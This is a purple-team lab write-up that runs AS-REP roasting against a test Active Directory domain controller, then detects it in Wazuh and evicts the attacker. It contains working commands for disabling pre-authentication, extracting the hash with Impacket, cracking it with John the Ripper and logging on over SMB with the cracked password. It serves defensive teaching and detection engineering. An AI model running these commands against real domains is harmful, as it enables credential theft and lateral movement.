# Lab 08 — Kerberos Authentication & AS-REP Roasting Incident Triage

*Part of the [Core Detection Labs](../README.md) — a complete purple-team investigation: Active Directory vulnerability injection, AS-REP roasting ticket extraction, offline password cracking, unauthorized SMB lateral movement, SIEM detection, and incident response eviction.*

---

## Overview

Most Kerberos security guides treat authentication as an abstract theory. This lab runs a complete **AS-REP Roasting (MITRE ATT&CK T1558.004)** lifecycle against an Active Directory Domain Controller (`WIN-SOCLAB`), captures the telemetry in **Wazuh 4.14.5**, correlates the event chain, and executes incident response to terminate unauthorized access.

| # | Step | Event | Wazuh Rule | Level | Description |
|---|---|---|---|---|---|
| 1 | Vulnerability Setup | 4738 / 4720 | 60109 / 60107 | 8 | Pre-authentication disabled on target account (`DONT_REQ_PREAUTH`) |
| 2 | AS-REQ Harvesting | 4768 | 100117 (custom) | 3 | TGT requested with `PreAuthType = 0` (no password supplied) |
| 3 | Offline Credential Cracking | — | — | — | Encrypted AS-REP hash cracked via John the Ripper and RockYou |
| 4 | Network Infiltration | 4624 | 60106 / 100114 | 3 / 5 | Unauthorized Network Logon (Type 3) via SMB to SYSVOL share |
| 5 | Triage & Incident Response | — | — | — | Active SMB session evicted via PowerShell (`Close-SmbSession -Force`) |

**Lab Environment:**
- **Domain Controller:** Windows Server 2022 (`WIN-SOCLAB.soclab.local`, `192.168.100.146`)
- **Attacker / SIEM Box:** Kali Linux 2026.2 (`192.168.100.50`) running Wazuh 4.14.5 in Docker
- **Monitored Agent:** Wazuh Agent `001` (`the-server-agent`) — Active

---

## What Is This Lab?

In standard Kerberos authentication, the client must prove knowledge of the user's password before the KDC will issue a TGT (**Pre-Authentication**, RFC 4120). The client encrypts a local timestamp using an encryption key derived from their password (`PreAuthType = 2`, `PA-ENC-TIMESTAMP`).

When an account is misconfigured with **"Do not require Kerberos preauthentication"** (`DONT_REQ_PREAUTH` flag in `userAccountControl`), an attacker can request a TGT for that account **without supplying any credentials**. The Domain Controller returns an encrypted AS-REP packet containing data encrypted with the victim's password hash. The attacker extracts this ciphertext and cracks it completely offline, generating no additional network traffic or lockout counters.

---

## Step-by-Step Lab Execution

### Step 1 — Vulnerability Setup on Domain Controller (`WIN-SOCLAB`)

On the Domain Controller, we configured a test account with Kerberos pre-authentication disabled:

```powershell
# Create target account
$Password = ConvertTo-SecureString "Password123" -AsPlainText -Force
New-ADUser -Name "victim-asrep" -SamAccountName "victim-asrep" `
    -UserPrincipalName "victim-asrep@soclab.local" `
    -AccountPassword $Password -Enabled $true

# Disable Kerberos Pre-Authentication
Set-ADAccountControl -Identity "victim-asrep" -DoesNotRequirePreAuth $true
```

![Vulnerability Injection in Active Directory](images/lab%20(1).png)

*Active Directory user configuration showing `DoesNotRequirePreAuth` enabled for `victim-asrep`.*

---

### Step 2 — Adversary Emulation: AS-REP Roasting from Kali Linux

From the Kali Linux attacker host (`192.168.100.50`), we leveraged Impacket's `GetNPUsers.py` to query the Domain Controller (`192.168.100.146`):

```bash
impacket-GetNPUsers soclab.local/victim-asrep -no-pass -dc-ip 192.168.100.146 -format hashcat -outputfile /tmp/victim.hash
```

![AS-REP Roasting Ticket Extraction](images/lab%20(2).png)

*Impacket `GetNPUsers` requesting TGT without password and dumping the encrypted AS-REP hash to `/tmp/victim.hash`.*

The KDC responded with an AS-REP response containing the encrypted timestamp:
```
$krb5asrep$23$victim-asrep@SOCLAB.LOCAL:74...$4d...
```
The `$23$` tag confirms RC4-HMAC encryption (`0x17`), which is highly vulnerable to dictionary attacks.

---

### Step 3 — Offline Password Recovery via John the Ripper

The extracted Kerberos hash was subjected to offline dictionary recovery against `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/victim.hash
```

![John the Ripper Cracking AS-REP Hash](images/lab%20(3).png)

*John the Ripper cracked the Kerberos hash in under one second: `Password123`.*

---

### Step 4 — Unauthorized Network Infiltration via SMB

Armed with recovered plaintext credentials, the adversary authenticated over SMB to access sensitive domain files:

```bash
impacket-smbclient soclab.local/victim-asrep:'Password123'@192.168.100.146
```

![SMB Access from Kali Linux](images/lab%20(4).png)

*Authenticated SMB session established on `WIN-SOCLAB` accessing SYSVOL and domain shares.*

![Confidential File Extraction via SMB](images/lab%20(5).png)

*Listing files and extracting domain resources over port 445.*

---

### Step 5 — SIEM Triage in Wazuh Dashboard

Navigating to the Wazuh Threat Hunting dashboard (`https://192.168.100.50`), we observed the full telemetry chain:

#### 1. Kerberos TGT Issuance (Event 4768)
Query: `rule.id: 100117 AND data.win.eventdata.targetUserName: "victim-asrep"`

![Wazuh Event 4768 Alert Firing](images/lab%20(11).png)

*Custom Rule 100117 firing on TGT request with `preAuthType: 0` originating from `192.168.100.50`.*

#### 2. Network Logon Correlation (Event 4624)
Query: `data.win.system.eventID: 4624 AND data.win.eventdata.targetUserName: "victim-asrep"`

![Wazuh Event 4624 Network Logon](images/lab%20(12).png)

*Logon Type 3 (Network) recorded immediately after the TGT issuance, confirming lateral access.*

---

### Step 6 — Incident Response & Active Session Eviction

During live triage, resetting an Active Directory password only blocks *new* logons; established stateful SMB connections remain live in the Windows kernel (`srv2.sys`).

```powershell
# Audit active SMB sessions
Get-SmbSession | Select-Object SessionId, ClientComputerAddress, ClientUserName, NumOpens
```

![Active SMB Sessions Audit](images/lab%20(21).png)

*Active session detected: Session ID `532575944833` holding open handles.*

```powershell
# Forcibly terminate the adversary's active connection
Close-SmbSession -SessionId 532575944833 -Force

# Remediate account settings in Active Directory
Set-ADAccountControl -Identity "victim-asrep" -DoesNotRequirePreAuth $false
Set-ADAccountPassword -Identity "victim-asrep" -NewPassword (ConvertTo-SecureString "CompromiseRemediated2026!" -AsPlainText -Force)
klist purge
```

![Connection Dropped on Kali Linux](images/lab%20(22).png)

*Kali Linux smbclient session instantly terminated with `Connection closed by remote host`.*

---

## SOC Takeaways & Detection Engineering

1. **PreAuthType `0` is the Tell:** In standard enterprise operations, PreAuthType should virtually always be `2` (PA-ENC-TIMESTAMP) or `15`. A 4768 event with `PreAuthType = 0` should generate an immediate Tier 1 SOC alert.
2. **SIEM Blind Spot Remediated:** Wazuh default rules drop Event 4768 at level 0. Implementing custom Rule **100117** restored critical visibility into the TGT exchange.
3. **Defense-in-Depth Eviction:** Password resets alone do not remediate active Kerberos or SMB compromises. Analysts must execute `Close-SmbSession -Force` and purge ticket caches to sever active attacker footholds.
